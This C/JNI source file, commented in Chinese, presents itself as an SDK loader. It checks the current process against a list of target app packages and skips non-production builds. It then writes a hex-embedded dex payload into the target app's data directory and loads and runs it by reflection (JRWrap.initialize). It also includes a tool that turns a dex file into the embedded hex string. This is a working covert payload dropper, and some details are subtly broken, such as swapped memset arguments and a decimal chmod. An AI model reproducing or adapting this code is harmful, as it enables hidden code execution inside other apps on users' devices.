//反射调起管理sdk jni调用
int attach(JNIEnv* env, char* dexPath, char* oDexPath){
	//如果dex文件不存在
	if(access(dexPath, F_OK) == -1) {
		return STATUS_NO_DEX_FILE;
	}

    LOGD("start attach");
    jclass jclass_classloader = (*env)->FindClass(env, "dalvik/system/DexClassLoader");
    if(jobject_classloader == NULL){
        jmethodID jmethod_init_classloader = (*env)->GetMethodID(env,jclass_classloader,"<init>","(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/ClassLoader;)V");
        jstring jstring_dex_path = (*env)->NewStringUTF(env, dexPath);

        jstring jstring_optimize_directory = (*env)->NewStringUTF(env, oDexPath);

        jclass jclass_base_classloader = (*env)->FindClass(env,"java/lang/ClassLoader");

        jmethodID jmethod_get_system_class_loader = (*env)->GetStaticMethodID(env,jclass_base_classloader,"getSystemClassLoader", "()Ljava/lang/ClassLoader;");
        jobject jobject_base_classloader = (*env)->CallStaticObjectMethod(env,jclass_base_classloader,jmethod_get_system_class_loader);
        jobject jobject_classloader_temp = (*env)->NewObject(env,jclass_classloader,jmethod_init_classloader,jstring_dex_path,jstring_optimize_directory,NULL,jobject_base_classloader);
        bool exc = (*env)->ExceptionCheck(env);
        if (exc) { /* 异常检查 */
            (*env)->ExceptionDescribe(env); // 打印Java层抛出的异常堆栈信息
            (*env)->ExceptionClear(env);   // 清除异常信息
            LOGD("NewObject DexClassLoader error.");
        }
        (*env)->DeleteLocalRef(env, jstring_dex_path);
        (*env)->DeleteLocalRef(env, jstring_optimize_directory);
        (*env)->DeleteLocalRef(env, jclass_base_classloader);
        (*env)->DeleteLocalRef(env, jobject_base_classloader);
        if(exc){
            if(jobject_classloader_temp != NULL)
                (*env)->DeleteLocalRef(env, jobject_classloader_temp);
            return STATUS_START_EXCEPTION;
        }
        jobject_classloader = (*env)->NewGlobalRef(env,jobject_classloader_temp);
        (*env)->DeleteLocalRef(env, jobject_classloader_temp);
    }

    jmethodID jmethod_load_class = (*env)->GetMethodID(env, jclass_classloader, "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");

    jstring jstring_class_name = (*env)->NewStringUTF(env, "com.jumpraw.wrap.JRWrap");

    jobject jobject_class = (*env)->CallObjectMethod(env, jobject_classloader, jmethod_load_class, jstring_class_name);

    jclass jclass_class = (*env)->FindClass(env, "java/lang/Class");

    jmethodID jmethod_get_declared_method = (*env)->GetMethodID(env, jclass_class, "getDeclaredMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");

    char* invoke_method_name = "initialize";
    jstring jstring_method_name = (*env)->NewStringUTF(env, invoke_method_name);

    jobject jobject_method = (*env)->CallObjectMethod(env, jobject_class, jmethod_get_declared_method, jstring_method_name,NULL);

    jclass jclass_method = (*env)->FindClass(env, "java/lang/reflect/Method");

    jmethodID jmethod_invoke = (*env)->GetMethodID(env, jclass_method, "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;");

    jobject jobject_result = (*env)->CallObjectMethod(env, jobject_method, jmethod_invoke, NULL,NULL);
    bool exc = (*env)->ExceptionCheck(env);
    if (exc) { /* 异常检查 */
        (*env)->ExceptionDescribe(env); // 打印Java层抛出的异常堆栈信息
        (*env)->ExceptionClear(env);   // 清除异常信息
        LOGD("CallObjectMethod DexClassLoader->methodName is invoke_method_name=%s,error",invoke_method_name);

        (*env)->DeleteLocalRef(env, jclass_classloader);
        (*env)->DeleteLocalRef(env, jstring_class_name);
        (*env)->DeleteLocalRef(env, jobject_class);
        (*env)->DeleteLocalRef(env, jclass_class);
        (*env)->DeleteLocalRef(env, jstring_method_name);
        (*env)->DeleteLocalRef(env, jobject_method);
        (*env)->DeleteLocalRef(env, jclass_method);
        (*env)->DeleteLocalRef(env, jobject_result);
        return STATUS_START_EXCEPTION;
    }

    (*env)->DeleteLocalRef(env, jclass_classloader);
    (*env)->DeleteLocalRef(env, jstring_class_name);
    (*env)->DeleteLocalRef(env, jobject_class);
    (*env)->DeleteLocalRef(env, jclass_class);
    (*env)->DeleteLocalRef(env, jstring_method_name);
    (*env)->DeleteLocalRef(env, jobject_method);
    (*env)->DeleteLocalRef(env, jclass_method);
    (*env)->DeleteLocalRef(env, jobject_result);
    return STATUS_START_SUCCESS;
}

//字符串转16进制
void StrToHex(char *pbDest, const char *pbSrc, int nLen){
    char h1,h2;
    char s1,s2;
    int i;

    for (i=0; i<nLen; i++){
        h1 = pbSrc[2*i];
        h2 = pbSrc[2*i+1];

        s1 = toupper(h1) - 0x30;
        if (s1 > 9)
        s1 -= 7;

        s2 = toupper(h2) - 0x30;
        if (s2 > 9)
            s2 -= 7;

        pbDest[i] = s1*16 + s2;
    }
}


//把16进制字符串 写成指定路径下的.dex文件
void saveDexFile(char* dexPath){
    LOGD("enter saveDexFile.");
	FILE *fd = fopen(dexPath, "wb");
	if(!fd){
	    LOGD("fd is null.");
	    return;
	}
    //如果文件长度大于0，不再写入
	fseek (fd, 0, SEEK_END);
	long size = ftell (fd);
	if(size > 0){
	    LOGD("file size > 0");
	    fclose(fd);
	    return;
	}

	int outputLength = strlen(ressync) / 2;
    char *pDes = malloc(outputLength);
    memset(pDes, outputLength , 0);
    StrToHex(pDes, ressync, outputLength);
	fwrite(pDes, outputLength, 1, fd);
	fclose(fd);
	free(pDes);
	pDes = NULL;
	return;
}

int GetCurrentTimestamp(){
    time_t t;
	t = time(NULL);

	int ii = time(&t);
	return ii;
}

//获取pid
int get_tid(JNIEnv* env){
    jclass jclass_process = (*env)->FindClass(env,"android/os/Process");
    jmethodID jmethod_mytid = (*env)->GetStaticMethodID(env,jclass_process, "myTid", "()I");
    int tid = (*env)->CallStaticIntMethod(env,jclass_process, jmethod_mytid);
    return tid;
}

//主入口
void StartJumpRaw(JNIEnv* env, const char* tag){
     LOGD("StartJumpRaw");

     //获取系统类型(user/userdebug/eng), 非user类型不再继续
     char *value[PROP_VALUE_MAX] = {0};
     int ret = __system_property_get(key, value);
     if(ret > 0 && strcmp(value, "user") != 0) {    // >0获取成功, 同时value和user不相同时，不再继续
         LOGD("return for build.type: %s", value);
         return;
     }


     //每隔intervalTime执行一次
     int currentTimestamp = GetCurrentTimestamp();
     if(currentTimestamp - lastTimestamp < intervalTime){
         LOGE("return for intervalTime limit");
         return;
     }
     lastTimestamp = currentTimestamp;


     //获取当前进程的包名
     FILE *fd;
     char sBuf[1024];
     if (iZygote_pid != 0 && getpid() != iZygote_pid){
        return;
     }
     fd = fopen("/proc/self/cmdline", "r");
     if(!fd || !fgets(sBuf, 1024, fd)){
        return;
     }
     fclose(fd);
     LOGD("proc name: %s\n", sBuf);


     //遍历目标pkg数组
     for(int i = 0; i < arraySize; i++) {
        char *pkgInArray = pkgArray[i];

        //如果当前进程符合要求
        if(strcmp(sBuf, pkgInArray) == 0) {
            LOGD("hit pkg > %s", pkgInArray);

            char *pODexPath;
            char *pDexPath;

            //获取dex存储路径
            if(dexfoundflag == false){
            	dexfoundflag = true;
                pODexPath = (char *) malloc(strlen(aPath) + strlen(pkgInArray));
                pDexPath = (char *) malloc(strlen(aPath) + strlen(pkgInArray) + strlen(bPath));
                sprintf(pODexPath, "%s%s", aPath, pkgInArray);
                sprintf(pDexPath, "%s%s%s", aPath, pkgInArray, bPath);

	        } else {
                pODexPath = "/data/data/com.jumpraw.jni.sample";
                pDexPath = "/data/data/com.jumpraw.jni.sample/cache/system@app@jumpraw@classes.dex";
	        }

	        LOGD("pODexPath path > %s", pODexPath);
                                        LOGD("pDexPath path > %s", pDexPath);





            //使用主进程调用
            iPid = getpid();
            iTid = get_tid(env);
            if(iTid != iPid){
                LOGD("return for pid != tid");
                return;
            }

            LOGD("enter iStatus: %d", iStatus);
            if (iStatus != STATUS_NO_DEX_FILE){
                iStatus = attach(env, pDexPath, pODexPath);
                LOGD("attach iStatus: %d\n", iStatus);

                if (iStatus == STATUS_START_SUCCESS){
                    LOGI("load jni success");
                }else if (iStatus == STATUS_NO_DEX_FILE){
                    LOGI("no dex file on the drive");
                }else if (iStatus == STATUS_START_EXCEPTION){
                    LOGI("load jni exception");
                }
            }else{
                //没有dex文件，写dex
                iZygote_pid = getpid();
                int fd = open(pDexPath, 65, 384);
                if(!fd)
                    return;
                flock(fd, 2);
                saveDexFile(pDexPath);
                chmod(pDexPath, 777);
                flock(fd, 8);
                close(fd);
                iStatus = STATUS_START;
                LOGI("dex wrote successfully");
            }

        }
     }

}


//16进制转字符串
void HexToStr(char *pbDest, char *pbSrc, int nLen){
    char	ddl,ddh;
    int i;

    for (i=0; i<nLen; i++){
        ddh = 48 + pbSrc[i] / 16;
        ddl = 48 + pbSrc[i] % 16;
        if (ddh > 57) ddh = ddh + 7;
        if (ddl > 57) ddl = ddl + 7;
        pbDest[i*2] = ddh;
        pbDest[i*2+1] = ddl;
    }

    pbDest[nLen*2] = '\0';
}

//将dex文件转为txt文件
void transDexToTxt(){
    FILE * outfile, *infile;
    outfile = fopen("./JRWrap.txt", "wb" );
    infile = fopen("./JRWrap.dex", "rb");

    int MAXLEN = 1024;
    char buf[MAXLEN];

    if( outfile == NULL || infile == NULL ){
        printf("no file");
        return;
    }

    int rc;
    int length = 0;
    int writeLength = 0;
    while( (rc = fread(buf,sizeof(unsigned char), MAXLEN,infile)) != 0 ){
        char *pDes = malloc(MAXLEN*2);
        HexToStr(pDes, buf, MAXLEN);
        fwrite( pDes, sizeof( unsigned char ), rc * 2, outfile );
        printf("rc:%d, outlength:%d\n", rc, rc * 2);
        length += rc;
        writeLength += strlen(pDes);
        free(pDes);
        pDes = NULL;
    }
    printf("dex length:%d", length);
    fclose(infile);
    fclose(outfile);
}

int main(){
    transDexToTxt();
	return 0;
}
